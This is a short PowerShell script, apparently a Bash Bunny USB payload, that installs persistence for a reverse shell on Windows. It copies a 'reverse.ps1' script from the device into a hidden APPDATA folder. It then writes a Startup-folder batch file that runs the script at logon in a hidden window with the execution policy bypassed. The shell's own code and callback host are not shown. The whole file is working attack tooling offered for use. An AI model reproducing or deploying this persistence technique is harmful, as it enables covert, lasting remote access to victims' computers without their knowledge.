# Variables
$hiddenFolderPath = "$env:APPDATA\HiddenFolder"
$reverseShellScriptSource = & {(Get-Volume -FileSystemLabel BashBunny).DriveLetter + ":\payloads\switch1\reverse.ps1"}
$batchFilePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\run_reverse.bat"

# 1. Create a Hidden Folder
Write-Host "Creating hidden folder at: $hiddenFolderPath"
try {
    New-Item -ItemType Directory -Path $hiddenFolderPath -Force | Out-Null
    attrib +h $hiddenFolderPath
    Write-Host "Hidden folder created successfully."
} catch {
    Write-Host "Failed to create hidden folder: $_"
}

# 2. Copy the Reverse Shell Script to the Hidden Folder
Write-Host "Copying reverse shell script to hidden folder..."
try {
    Copy-Item -Path $reverseShellScriptSource -Destination "$hiddenFolderPath\reverse.ps1" -Force
    Write-Host "Reverse shell script copied successfully."
} catch {
    Write-Host "Failed to copy reverse shell script: $_"
}

# 3. Create a Batch File in the Startup Folder
Write-Host "Creating batch file in the Startup folder..."
$batchContent = '@echo off
PowerShell -Command "& {Start-Process PowerShell -ArgumentList ''-ExecutionPolicy Bypass -NoProfile -File ""' + $hiddenFolderPath + '\reverse.ps1""'' -WindowStyle Hidden}"'
try {
    Set-Content -Path $batchFilePath -Value $batchContent
    Write-Host "Batch file created successfully at: $batchFilePath"
} catch {
    Write-Host "Failed to create batch file: $_"
}

Write-Host "Setup complete. Please verify each step worked as expected."